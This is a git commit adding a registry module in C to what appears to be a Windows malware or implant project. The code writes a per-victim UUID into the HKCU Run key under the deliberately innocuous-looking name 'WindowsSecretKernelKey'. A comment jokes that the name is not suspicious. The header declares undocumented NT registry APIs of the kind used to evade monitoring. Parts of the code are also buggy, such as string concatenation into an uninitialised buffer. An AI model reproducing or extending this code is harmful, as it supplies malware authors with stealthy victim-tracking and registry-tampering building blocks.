a04a011a7af85a2ca7fae9f4e63859b5b47692ac
x03 <darkpower289@gmail.com>
2025-06-15 17:32:48 +0200

    add regedit

---
+++ regedit.c
@@ -0,0 +1,87 @@
+#include <stdbool.h>
+#include <string.h>
+#include <stdio.h>
+#include "utils.h"
+#include "regedit.h"
+#include <lmcons.h>
+
+// https://redcanary.com/blog/threat-detection/windows-registry-attacks-threat-detection/
+
+LPBYTE getOrCreateAndGetUserId() {
+    LPBYTE existingUUID = queryRegedit(L"WindowsSecretKernelKey"); // WindowsSecretKernelKey sounds like it's not suspicious, right?
+    if (existingUUID != NULL) {
+        return existingUUID;
+    }
+    
+    LPBYTE uuid = malloc(sizeof(LPBYTE) * 37);
+    if (uuid == NULL) {
+        exit(1);
+    }
+
+    generateUserId(uuid);
+    setRegeditKeyValue(L"WindowsSecretKernelKey", L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", (LPCWSTR)uuid);
+    return uuid;
+}
+
+LPBYTE queryRegedit(LPCWSTR lpValueName) {
+    HKEY hKey;
+    LPCWSTR keyPath = L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
+    DWORD dataType = REG_SZ;
+    DWORD dataSize = 0;
+
+    if (RegOpenKeyExW(HKEY_CURRENT_USER, keyPath, 0, KEY_READ, &hKey) != ERROR_SUCCESS) {
+        exit(1);
+    }
+
+    if (RegQueryValueExW(hKey, lpValueName, NULL, &dataType, NULL, &dataSize) != ERROR_SUCCESS) {
+        RegCloseKey(hKey);
+        exit(1);
+    }
+
+    LPBYTE data = (LPBYTE)malloc(dataSize);
+    if (!data) {
+        RegCloseKey(hKey);
+        exit(1);
+    }
+
+    DWORD result = RegQueryValueExW(hKey, lpValueName, NULL, &dataType, data, &dataSize);
+    RegCloseKey(hKey);
+
+    if (result == ERROR_SUCCESS) {
+        return data;
+    } else {
+        free(data);
+        return NULL;
+    }
+}
+
+DWORD setRegeditKeyValue(LPCWSTR lpValueName, LPCWSTR key, LPCWSTR uuid) {
+    HKEY hKey;
+    DWORD status = RegCreateKeyExW(
+        HKEY_CURRENT_USER, key, 0, NULL, REG_OPTION_NON_VOLATILE,
+        KEY_WRITE, NULL, &hKey, NULL
+    );
+    if (status != ERROR_SUCCESS) {
+        exit(1);
+    }
+
+    size_t fullLen = wcslen(uuid) + 1;
+    wchar_t* fullPath = malloc(sizeof(wchar_t) * fullLen);
+    if (!fullPath) {
+        RegCloseKey(hKey);
+        exit(1);
+    }
+
+    wcscat(fullPath, uuid);
+
+    DWORD result = RegSetValueExW(
+        hKey, lpValueName, 0, REG_SZ,
+        (const BYTE*)fullPath,
+        (DWORD)((wcslen(fullPath) + 1) * sizeof(wchar_t))
+    );
+
+    free(fullPath);
+    RegCloseKey(hKey);
+
+    return (result == ERROR_SUCCESS) ? 0 : result;
+}
---
+++ regedit.h
@@ -0,0 +1,106 @@
+#ifndef REGEDIT_H
+#define REGEDIT_H
+
+#include <windows.h>
+#include "shared.h"
+
+typedef enum _KEY_VALUE_INFORMATION_CLASS {
+    KeyValueBasicInformation,
+    KeyValueFullInformation,
+    KeyValuePartialInformation,
+    KeyValueFullInformationAlign64,
+    KeyValuePartialInformationAlign64,
+    KeyValueLayerInformation,
+    MaxKeyValueInfoClass
+} KEY_VALUE_INFORMATION_CLASS;
+
+typedef NTSTATUS (NTAPI* fn_NtOpenKey)(
+    _Out_ PHANDLE KeyHandle,
+    _In_ ACCESS_MASK DesiredAccess,
+    _In_ POBJECT_ATTRIBUTES ObjectAttributes
+);
+
+typedef NTSTATUS (NTAPI* fn_NtQueryValueKey)(
+    _In_ HANDLE KeyHandle,
+    _In_ PUNICODE_STRING ValueName,
+    _In_ KEY_VALUE_INFORMATION_CLASS KeyValueInformationClass,
+    _Out_writes_bytes_to_opt_(Length, *ResultLength) PVOID KeyValueInformation,
+    _In_ ULONG Length,
+    _Out_ PULONG ResultLength
+);
+
+typedef NTSTATUS (NTAPI* fn_NtClose)(
+    IN HANDLE Handle
+);
+
+typedef NTSTATUS (NTAPI* fn_RtlCheckRegistryKey)(
+    IN ULONG RelativeTo,
+    IN PWSTR Path
+);
+
+typedef NTSTATUS (NTAPI RTL_QUERY_REGISTRY_ROUTINE)(
+    _In_ PWSTR ValueName,
+    _In_ ULONG ValueType,
+    _In_ PVOID ValueData,
+    _In_ ULONG ValueLength,
+    _In_opt_ PVOID Context,
+    _In_opt_ PVOID EntryContext
+);
+
+typedef RTL_QUERY_REGISTRY_ROUTINE *PRTL_QUERY_REGISTRY_ROUTINE;
+
+typedef struct _RTL_QUERY_REGISTRY_TABLE {
+    PRTL_QUERY_REGISTRY_ROUTINE QueryRoutine;
+    ULONG Flags;
+    PWSTR Name;
+    PVOID EntryContext;
+    ULONG DefaultType;
+    PVOID DefaultData;
+    ULONG DefaultLength;
+} RTL_QUERY_REGISTRY_TABLE, *PRTL_QUERY_REGISTRY_TABLE;
+
+typedef NTSTATUS (NTAPI* fn_RtlQueryRegistryValues)(
+    IN ULONG RelativeTo,
+    IN PCWSTR Path,
+    _Inout_ PRTL_QUERY_REGISTRY_TABLE QueryTable,
+    _In_opt_ PVOID Context,
+    _In_opt_ PVOID Environment
+);
+
+typedef NTSTATUS (NTAPI* fn_NtCreateKey)(
+  OUT           PHANDLE            KeyHandle,
+  IN            ACCESS_MASK        DesiredAccess,
+  IN            POBJECT_ATTRIBUTES ObjectAttributes,
+                  ULONG              TitleIndex,
+  _In_opt_  PUNICODE_STRING    Class,
+  IN            ULONG              CreateOptions,
+  _Out_opt_ PULONG             Disposition
+);
+
+/**
+ * @brief Opens a registry key and queries the user's UUID value.
+ *
+ * @param lpValueName Pointer to a constant, null-terminated wide-character string specifying the registry value name to query.
+ * @return LPBYTE Pointer to a buffer containing binary data with the user's UUID.
+ *
+ */
+LPBYTE queryRegedit(LPCWSTR lpValueName);
+
+/**
+ * @brief Creates or updates a registry record by setting a newly generated UUID under a specified key and value name.
+ *
+ * @param lpValueName Pointer to a constant, null-terminated wide-character string specifying the registry value name to set.
+ * @param key Pointer to a constant, null-terminated wide-character string specifying the registry key path where the value will be set.
+ * @param uuid Pointer to a null-terminated wide-character string containing the UUID to store.
+ * @return DWORD Returns 0 on success, otherwise program exits.
+ */
+DWORD setRegeditKeyValue(LPCWSTR lpValueName, LPCWSTR key, LPCWSTR uuid);
+
+/**
+ * @brief Retrieves the user's UUID from the registry, or creates and returns a new UUID if none exists.
+ *
+ * @return Pointer to a buffer containing binary data with the user's UUID.
+ */
+LPBYTE getOrCreateAndGetUserId();
+
+#endif
